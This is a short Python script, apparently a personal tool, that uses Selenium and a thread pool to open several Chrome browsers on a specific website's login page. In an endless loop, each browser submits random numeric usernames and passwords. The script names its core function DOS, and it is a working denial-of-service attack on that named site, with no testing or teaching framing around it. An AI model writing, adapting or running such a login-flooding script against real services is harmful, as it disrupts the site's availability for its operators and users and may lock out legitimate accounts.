from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import random
from multiprocessing.dummy import Pool as ThreadPool
################################################################
nthreads = 3

target = "https://zehn.ramanapp.com/login/"

f1 =  "username"
f2 = "password"
subkey = "loginbtn"

f1val = "Mohsen_cactus"
f2val = "PAAAAASSSSSSWOORD"

chromepath = "C:\\Users\\mohse\\.wdm\\drivers\\chromedriver\\win32\\88.0.4324.96\\chromedriver.exe"
browserlist = []
blcounter = []
################################################################
def DOS(X):
    br = browserlist[X]

    f1val = str(random.randint(0, 100000))
    f2val = str(random.randint(0, 100000))

    field1 = br.find_element_by_id(f1)
    field2 = br.find_element_by_id(f2)

    field1.send_keys(f1val)
    field2.send_keys(f2val)

    br.find_element_by_id(subkey).click()


for i in range(0,nthreads):
    browser = webdriver.Chrome(chromepath)
    browser.get(target)
    browserlist.append(browser)
    blcounter.append(i)

pool = ThreadPool(4)
sleep(5)
################################################################
while True:
    results = pool.map(DOS,blcounter)